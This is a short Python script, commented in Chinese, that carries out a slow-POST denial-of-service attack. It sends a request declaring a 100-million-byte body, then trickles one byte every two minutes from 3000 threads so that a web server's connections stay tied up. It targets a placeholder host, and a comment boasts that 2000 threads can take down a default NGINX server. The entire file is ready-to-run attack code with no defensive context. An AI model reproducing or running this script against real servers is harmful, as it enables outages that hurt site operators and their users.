#!/usr/bin/python
#-*- coding:utf-8 -*-
"""
攻击原理:
在请求报文中声明 Content-Length: 100000000 , 表示需要发送巨大的POST数据, 报文主体以非常慢的速度发送数据, 发送过程中会一直占用链接, 当攻击数量一多起来, 服务器就会因为链接数量过多而拒绝服务
"""

import socket
import time
from threading import Thread


class DDOS(Thread):
    def __init__(self):
        Thread.__init__(self)

    def run(self):
        self.ddos()

    def ddos(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = 'www.example.com'  # DDOS攻击地址, 可以是IP或者域名
        sock.connect((host, 80))
        sock.send(
            'POST / HTTP/1.1\r\n' +
            'Host: ' + host + '\r\n' +
            'Connection: keep-alive\r\n' +
            'Cache-Control: max-age=0\r\n' +
            'Content-Length: 100000000\r\n' +
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n' +
            'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.69 Safari/537.36\r\n' +
            'DNT: 1\r\n' +
            'Accept-Language: zh-CN,zh;q=0.8\r\n'
        )
        sock.send('Cookie: user=Alex+Porter\r\n\r\n')
        while True:  # 以非常慢的速度发送数据
            sock.send('z')
            time.sleep(120)
        print(sock.recv(1024))
        sock.close()


arr = []
for i in range(3000):  # range中设置攻击的线程数量, 2000的线程就可以拖垮默认配置的NGINX服务器(响应500).
    arr.append(DDOS())
    arr[i].start()